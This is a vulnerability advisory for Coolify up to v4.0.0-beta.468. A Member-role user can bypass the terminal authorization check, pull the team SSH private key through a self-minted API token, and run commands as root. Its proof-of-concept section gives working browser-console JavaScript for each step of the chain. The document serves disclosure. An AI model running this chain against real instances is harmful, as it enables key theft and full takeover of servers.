## Summary

Coolify contains a critical server-side authorization flaw in its terminal WebSocket flow. A low-privileged authenticated team member who cannot access the terminal UI can still call the backend terminal endpoints directly, obtain terminal-enabled target hosts, and use the WebSocket terminal backend to execute commands on the managed host. In the reproduced exploit chain, the attacker can also generate an API token, retrieve the host SSH private key, and then achieve arbitrary command execution on the target host as `root`.


## Details

Under the intended permission model, low-privileged `Member` users should not be allowed to access terminal functionality. The frontend route reflects that expectation, but the backend trust chain for the terminal WebSocket does not enforce the same authorization rule.

### Brief Code Analysis

1. The intended authorization boundary exists on the terminal page route and only allows admins or owners:

Permalink: [app/Providers/AuthServiceProvider.php#L72-L75](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/app/Providers/AuthServiceProvider.php#L72-L75)

```php
Gate::define('canAccessTerminal', function ($user) {
    return $user->isAdmin() || $user->isOwner();
});
```

Permalink: [app/Http/Middleware/CanAccessTerminal.php#L16-L27](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/app/Http/Middleware/CanAccessTerminal.php#L16-L27)

```php
if (! auth()->user()->can('canAccessTerminal')) {
    abort(403, 'Access to terminal functionality is restricted to team administrators');
}
```

Permalink: [routes/web.php#L159-L159](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/routes/web.php#L159-L159)

```php
Route::get('/terminal', TerminalIndex::class)->name('terminal')->middleware('can.access.terminal');
```

2. The actual backend terminal endpoints only check whether the user is authenticated. They do not enforce `canAccessTerminal`:


Permalink: [routes/web.php#L160-L191](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/routes/web.php#L160-L191)

```php
Route::post('/terminal/auth', function () {
    if (auth()->check()) {
        return response()->json(['authenticated' => true], 200);
    }
})->name('terminal.auth');

Route::post('/terminal/auth/ips', function () {
    if (auth()->check()) {
        $team = auth()->user()->currentTeam();
        $ipAddresses = $team->servers
            ->where('settings.is_terminal_enabled', true)
            ->pluck('ip')
            ->filter()
            ->values();

        return response()->json(['ipAddresses' => $ipAddresses->all()], 200);
    }
})->name('terminal.auth.ips');
```

3. The realtime terminal server trusts those two weaker endpoints. WebSocket access is approved after `/terminal/auth`, and the session is populated with hosts from `/terminal/auth/ips`:

Permalink: [docker/coolify-realtime/terminal-server.js#L57-L106](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/docker/coolify-realtime/terminal-server.js#L57-L106)

```javascript
const response = await axios.post(`http://coolify:8080/terminal/auth`, null, {
    headers: {
        'Cookie': `${sessionCookieName}=${laravelSession}`,
        'X-XSRF-TOKEN': xsrfToken
    },
});

if (response.status === 200) {
    callback(true);
}
```

Permalink: [docker/coolify-realtime/terminal-server.js#L108-L138](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/docker/coolify-realtime/terminal-server.js#L108-L138)

```javascript
const response = await axios.post(`http://coolify:8080/terminal/auth/ips`, null, {
    headers: {
        'Cookie': `${sessionCookieName}=${laravelSession}`,
        'X-XSRF-TOKEN': xsrfToken
    },
});
userSession.authorizedIPs = response.data.ipAddresses || [];
```

4. When a terminal command is later submitted, the backend only checks whether the target host belongs to that authorized host list. It does not re-check the higher-privilege terminal role:

Permalink: [docker/coolify-realtime/terminal-server.js#L273-L281](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/docker/coolify-realtime/terminal-server.js#L273-L281)

```javascript
if (!isAuthorizedTargetHost(targetHost, userSession.authorizedIPs)) {
    ws.send(`Unauthorized: Target host ${targetHost} not in authorized list`);
    return;
}
```

Permalink: [docker/coolify-realtime/terminal-utils.js#L100-L114](https://github.com/coollabsio/coolify/blob/v4.0.0-beta.468/docker/coolify-realtime/terminal-utils.js#L100-L114)

```javascript
export function extractTargetHost(sshArgs) {
    const userAtHost = sshArgs.find(arg => /^[^@]+@[^@]+$/.test(arg));
    return normalizeHostForAuthorization(userAtHost.slice(atIndex + 1));
}
```

The effective trust model is therefore reduced to: if the user is authenticated and the host is present in `/terminal/auth/ips`, the terminal backend will accept the command. That bypasses the stronger admin or owner check that only protects the `/terminal` page.

In the reproduced exploit chain, this terminal authorization bypass is combined with currently exposed functionality that lets the low-privileged user generate an API token and retrieve the team SSH private key. With that key, the attacker can use the terminal backend to SSH into the target host as `root` and execute arbitrary commands.

## PoC

### Environment Setup and Prerequisites

You can deploy a vulnerable Coolify instance using the official installation script:

```bash
# Install Coolify on a fresh server
curl -fsSL https://cdn.coollabs.io/coolify/install.sh | bash
```

1. Open the web UI, usually at `http://IP:8000` or port `80`.
2. Complete the initialization flow and create an administrator account.
3. The platform will automatically configure a default `localhost` server (`host.docker.internal`).
4. Invite or create a second low-privileged user account with the `Member` role.
5. Log out of the administrator account and log in as the low-privileged `Member` account for the following exploitation steps.

### Exploitation Steps

While logged in as the `Member` account, the frontend UI normally blocks terminal access. All of the following reproduction steps are executed in the browser developer console.

<img width="3056" height="1632" alt="image" src="https://github.com/user-attachments/assets/e9d7ad69-ec75-452e-802e-55ee9aea57ec" />


#### Step 1: Obtain an Available Internal Host

Call `/terminal/auth/ips` to retrieve target host information:

```javascript
async () => {
  const cookieValue = document.cookie.split('; ').find(v => v.startsWith('XSRF-TOKEN='))?.split('=').slice(1).join('=');
  const xsrf = cookieValue ? decodeURIComponent(cookieValue) : null;
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
  const res = await fetch('/terminal/auth/ips', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest', 'X-CSRF-TOKEN': csrf, 'X-XSRF-TOKEN': xsrf }
  });
  return { csrf, xsrfStart: xsrf?.slice(0, 30), status: res.status, text: await res.text() };
}
```

Expected result: the response returns one or more hosts available for terminal execution, such as `host.docker.internal`.

<img width="922" height="360" alt="image" src="https://github.com/user-attachments/assets/7edda79b-bf95-407b-8d4f-61d9a758c1e0" />


#### Step 2: Generate an API Token

Visit `/security/api-tokens`.

Generating an API token is an allowed action for a low-privileged user in the current system design. The token can be created and extracted by invoking the frontend component directly:

```javascript
async () => {
  const comp = (window.Livewire?.all?.() || []).find(c => c.name === 'security.api-tokens');
  if (!comp) return { error: 'component not found' };

  const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
  const payload = {
    _token: csrf,
    components: [{
      snapshot: comp.snapshotEncoded,
      updates: {
        description: 'member-browser-debug-2',
        permissions: ['read', 'write'],
        isApiEnabled: true,
      },
      calls: [{ path: '', method: 'addNewToken', params: [] }],
    }],
  };

  const res = await fetch('/livewire/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'X-CSRF-TOKEN': csrf,
      'X-Livewire': 'true',
      'X-Requested-With': 'XMLHttpRequest',
    },
    body: JSON.stringify(payload),
  });

  const text = await res.text();
  const parsed = JSON.parse(text);
  const html = parsed?.components?.[0]?.effects?.html || '';
  const tokenMatch = html.match(/Please copy this token now[\\s\\S]*?<div[^>]*>([^<]*\\|[^<]*)<\\/div>/i) || html.match(/Please copy this token now[\\s\\S]*?<div[^>]*>\\s*([^<\\s][^<]*)\\s*<\\/div>/i);
  return {
    status: res.status,
    tokenGuess: tokenMatch ? tokenMatch[1].trim() : null,
  };
}
```

Expected result: the freshly created token is visible in `tokenGuess`.

<img width="1048" height="250" alt="image" src="https://github.com/user-attachments/assets/be38b90e-08b7-4c49-8648-666d6989167f" />


#### Step 3: Retrieve the Target Host Private Key

Replace `<token>` with the token obtained in Step 2, then call the REST API:

```javascript
async () => {
  const token = '<token>';
  const enable = await fetch('/api/v1/enable', {
    method: 'GET',
    headers: { Authorization: `Bearer ${token}`, Accept: 'application/json' },
  });
  const keys = await fetch('/api/v1/security/keys', {
    method: 'GET',
    headers: { Authorization: `Bearer ${token}`, Accept: 'application/json' },
  });
  return {
    keysStatus: keys.status,
    keysText: await keys.text(),
  };
}
```

Expected result: the JSON response contains the SSH private key in plaintext.

<img width="2532" height="316" alt="image" src="https://github.com/user-attachments/assets/c8ed5a3d-29cd-49f6-acc0-49ce6cc9054e" />


#### Step 4: Trigger Remote Code Execution Through the WebSocket Interface

Replace `<private-key>` with the extracted private key name or content, and replace `<host>` with the hostname obtained in Step 1.

The following payload executes `whoami; hostname; pwd` on the target machine:

```javascript
async () => {
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
  const xsrfCookie = document.cookie.split('; ').find(v => v.startsWith('XSRF-TOKEN='))?.split('=').slice(1).join('=');
  const xsrf = xsrfCookie ? decodeURIComponent(xsrfCookie) : null;
  const headers = {
    'Accept': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'X-CSRF-TOKEN': csrf,
    'X-XSRF-TOKEN': xsrf,
  };

  await fetch('/terminal/auth', { method: 'POST', credentials: 'include', headers });

  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  const wsUrl = `${proto}://${location.hostname}:6002/terminal/ws`;

  const command = "timeout 3600 ssh -i /var/www/html/storage/app/ssh/keys/ssh_key@<private-key> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no -o ConnectTimeout=10 -o ServerAliveInterval=20 -o RequestTTY=no -o LogLevel=ERROR -p '22' 'root'@'<host>' 'bash -se' << \\EOF\nwhoami; hostname; pwd\nEOF";

  const result = await new Promise((resolve) => {
    const messages = [];
    const ws = new WebSocket(wsUrl);
    const timeout = setTimeout(() => {
      try { ws.close(); } catch {}
      resolve({ timeout: true, messages });
    }, 20000);

    ws.onopen = () => {
      ws.send(JSON.stringify({ command: [command] }));
    };

    ws.onmessage = (event) => {
      messages.push({ type: 'message', data: String(event.data) });
      if (String(event.data) === 'pty-exited') {
        clearTimeout(timeout);
        try { ws.close(); } catch {}
        resolve({ timeout: false, messages });
      }
    };
  });

  return result.messages.filter(m => m.type === 'message').map(m => m.data).join('');
}
```

Expected result: the WebSocket response contains command output from the target host. If it returns `root`, that demonstrates successful unauthorized RCE as `root`.

<img width="1458" height="364" alt="image" src="https://github.com/user-attachments/assets/3fe0eeee-9186-48ab-b24a-d63866134276" />


## Impact

This is an authorization bypass that results in remote code execution.

- Low-privileged authenticated `Member` users in a Coolify team are impacted because they can bypass the intended terminal access restriction.
- Self-hosted Coolify instances using the `coollabsio/coolify` Composer package are affected. Based on the repository state checked on March 20, 2026, the affected range is `<= v4.0.0-beta.468`, with no patched version identified.
- In the reproduced exploit chain, the attacker can obtain the server SSH private key and then execute commands as `root`, leading to full host compromise.
